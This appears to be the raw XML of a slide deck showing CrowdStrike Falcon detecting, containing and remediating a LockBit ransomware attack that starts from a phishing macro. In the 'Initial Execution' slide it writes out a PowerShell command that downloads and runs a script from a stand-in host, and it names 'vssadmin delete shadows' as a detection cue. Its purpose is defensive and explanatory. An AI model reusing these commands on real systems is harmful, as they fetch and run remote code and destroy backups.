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80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151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26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CrowdStrike Falcon vs. Ransomware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7096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Attack Scenario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77809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employee at a finance company receives a phishing email with a malicious Word document. They open it and unknowingly trigger a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LockBit ransomware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attack.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18692"/>
            <a:ext cx="7140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How CrowdStrike Stops It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967633"/>
            <a:ext cx="7556421" cy="19994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63160" y="3643675"/>
            <a:ext cx="1142192" cy="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Initial Execution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863160" y="4110868"/>
            <a:ext cx="1142192" cy="327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document opened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172028" y="3496427"/>
            <a:ext cx="1142191" cy="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CrowdStrike Detects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172028" y="3963620"/>
            <a:ext cx="1142191" cy="327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Falcon senses suspicious activity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480895" y="3643675"/>
            <a:ext cx="1142192" cy="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Ransomware Starts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480895" y="4110868"/>
            <a:ext cx="1142192" cy="4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LockBit begins encryption process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789762" y="3332819"/>
            <a:ext cx="1142193" cy="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Falcon Kills Threat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789762" y="3800012"/>
            <a:ext cx="1142193" cy="4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terminated and contained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2105901" y="3643675"/>
            <a:ext cx="1142193" cy="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SOC Investigates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2105901" y="4110868"/>
            <a:ext cx="1142193" cy="327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Analysts review telemetry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280190" y="522220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CrowdStrike Falcon intercepts a LockBit ransomware attack in real time — from the moment a malicious document is opened to full containment in under 10 seconds.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7129"/>
            <a:ext cx="1056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1: Initial Execution </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4450" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFAD9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(T+0 seconds)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846070"/>
            <a:ext cx="6571417" cy="3586401"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4554"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFAD94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072884"/>
            <a:ext cx="3480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the Employee Does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654028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opens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"Invoice.docx"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launches a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macro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Downloads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LockBit ransomware payload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silently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072884"/>
            <a:ext cx="3498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Malicious Command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6540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macro executes the following PowerShell command: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4272082"/>
            <a:ext cx="6244709" cy="190523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588210" y="4272082"/>
            <a:ext cx="6267331" cy="190523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871698" y="4498896"/>
            <a:ext cx="570035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powershell.exe -ExecutionPolicy Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')"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22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2: CrowdStrike Detects Suspicious Behavior </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4450" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFAD9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(T+2 seconds)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6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Falcon agent on the endpoint monitors all process activity in real time and immediately flags anomalous behavior.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4466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344466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6017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Word Spawning PowerShell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4465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(unusual)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Microsoft Word should not be launching PowerShell processes under normal circumstances.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44466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344466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6017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PowerShell Downloading from External URL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4465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(suspicious)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An outbound download request to an unknown external domain is triggered.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344466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344466"/>
            <a:ext cx="121920" cy="281094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6017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New Process Injecting into Memory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4465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(malicious): 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newly spawned process attempts to inject code directly into memory.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641056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FFC4B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762274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30906" y="669405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AI flags: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"Suspicious macro execution detected"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860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3: Ransomware Starts Encrypting </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4450" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFAD9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(T+5 seconds)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53138"/>
            <a:ext cx="3541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LockBit Begins Its Attack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3428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Deleting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shadow copies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(backup removal)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Encrypting files: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.docx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.docx.locked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Spreading to network shares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3926324"/>
            <a:ext cx="6571417" cy="2134553"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 7651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7662982" y="4153138"/>
            <a:ext cx="28497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CrowdStrike Detects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4734282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 file modification (encryption pattern)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VSS deletion (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1750" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F2A0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vssadmin delete shadows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Lateral movement attempts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930" y="628055"/>
            <a:ext cx="7592139" cy="90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4: Falcon Kills the Threat </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFAD9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(T+7 seconds)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75930" y="1665923"/>
            <a:ext cx="7592139" cy="37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CrowdStrike automatically responds  stopping the attack before it can spread further. Only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files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were encrypted before containment.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75930" y="2145625"/>
            <a:ext cx="7592139" cy="1295400"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 46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7616" y="2297311"/>
            <a:ext cx="432197" cy="432197"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 21154903"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFAD9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440" y="2416135"/>
            <a:ext cx="194429" cy="1944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7616" y="2820948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Kills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27616" y="3100983"/>
            <a:ext cx="7288768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malicious PowerShell process is terminated immediately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75930" y="3532465"/>
            <a:ext cx="7592139" cy="1295400"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 46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27616" y="3684151"/>
            <a:ext cx="432197" cy="432197"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 21154903"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFAD9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440" y="3802975"/>
            <a:ext cx="194429" cy="1944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7616" y="4207788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Quarantines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27616" y="4487823"/>
            <a:ext cx="7288768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ransomware payload is isolated and neutralized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75930" y="4919305"/>
            <a:ext cx="7592139" cy="1295400"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 46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27616" y="5070991"/>
            <a:ext cx="432197" cy="432197"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 21154903"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFAD9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440" y="5189815"/>
            <a:ext cx="194429" cy="1944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7616" y="5594628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Isolates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27616" y="5874663"/>
            <a:ext cx="7288768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device is cut off from the network entirely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75930" y="6306145"/>
            <a:ext cx="7592139" cy="1295400"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 46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7616" y="6457831"/>
            <a:ext cx="432197" cy="432197"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 21154903"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFAD9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6440" y="6576655"/>
            <a:ext cx="194429" cy="1944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616" y="6981468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Blocks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27616" y="7261503"/>
            <a:ext cx="7288768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malicious IP/domain is blacklisted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246"/>
            <a:ext cx="848951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5: SOC Analyst Investigates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17000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Falcon provides the analyst with a full </a:t>
            </a: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tree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showing the complete attack chain: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283381"/>
            <a:ext cx="13042821" cy="2447449"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 369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074" y="2283381"/>
            <a:ext cx="13064252" cy="2447449"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 132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52393" y="2498765"/>
            <a:ext cx="12525613" cy="201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WINWORD.EXE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PowerShell.exe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LockBit.exe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vssadmin.exe  (shadow copy deletion)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cmd.exe       (file encryption)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net.exe       (lateral movement attempt)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503789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Analyst Sees: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93790" y="5681543"/>
            <a:ext cx="4211122" cy="1913692"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 472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794" y="590454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👤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Affected User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6794" y="6363891"/>
            <a:ext cx="376511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user account was compromised and triggered the attack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209580" y="5681543"/>
            <a:ext cx="4211122" cy="1913692"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 472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2584" y="590454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📄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Encrypted Files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32584" y="6363891"/>
            <a:ext cx="376511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files were encrypted during the brief window of activity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625370" y="5681543"/>
            <a:ext cx="4211122" cy="1913692"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 472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48374" y="590454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🌐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Contacted IPs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48374" y="6363891"/>
            <a:ext cx="376511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external IP addresses and domains were reached out to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15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Step 6: Remediation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39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SOC team executes a structured remediation plan to fully recover and harden the environment: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2201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286452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2899886"/>
            <a:ext cx="5441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Restores 3 encrypted files from backup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37859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8860" y="38284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3863816"/>
            <a:ext cx="3947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Resets employee credentials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47498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860" y="479238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530906" y="4827746"/>
            <a:ext cx="4203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Patches the vulnerability used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790" y="57138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860" y="57563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530906" y="5791676"/>
            <a:ext cx="4470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Deploys updated detection rules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3790" y="667773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860" y="67202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530906" y="6755606"/>
            <a:ext cx="62754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Sends security awareness training to all staff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59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Timeline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83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moment the malicious document was opened to full remediation, here's how the entire incident unfolded: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46452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5407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9778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T+0s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197781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opens malicious document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0439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84810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T+2s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384810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CrowdStrike detects suspicious behavior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35471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49841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T+5s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598" y="4498419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Ransomware starts encrypting files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00503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14873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T+7s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37598" y="5148739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CrowdStrike kills &amp; isolates threat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5535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9905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T+10s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799058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 analyst notified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30566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44937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T+30min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598" y="6449378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remediation complete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132"/>
            <a:ext cx="69537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CrowdStrike Features Used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531382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554242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FFD8C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654" y="1939528"/>
            <a:ext cx="272177" cy="272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7592" y="17356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Behavioral AI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87592" y="2106216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unknown ransomware variants without relying on signatures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3790" y="2765227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6650" y="2788087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FFD8C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654" y="3173373"/>
            <a:ext cx="272177" cy="2721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87592" y="296953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Process Tree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687592" y="3340060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attack visibility see every process spawned during the incident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3790" y="3999071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6650" y="4021931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FFD8C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654" y="4407218"/>
            <a:ext cx="272177" cy="2721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87592" y="420338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Auto-Containment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687592" y="4573905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Isolates the device instantly to prevent lateral spread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93790" y="5232916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6650" y="5255776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FFD8C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9654" y="5641062"/>
            <a:ext cx="272177" cy="27217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87592" y="543722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Threat Graph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1687592" y="5807750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Maps the attacker's full activity across the environment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93790" y="6466761"/>
            <a:ext cx="13042821" cy="10887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6650" y="6489621"/>
            <a:ext cx="725805" cy="1042988"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6721"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFD8C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9654" y="6874907"/>
            <a:ext cx="272177" cy="27217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87592" y="667107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OverWatch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1687592" y="7041594"/>
            <a:ext cx="1194470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24/7 human threat hunting team providing continuous monitoring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Merriweather Bold</vt:lpstr>
      <vt:lpstr>Open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2026-03-21T14:42:03Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-03-21T14:43:22Z</dcterms:modified>
</cp:coreProperties>
</file>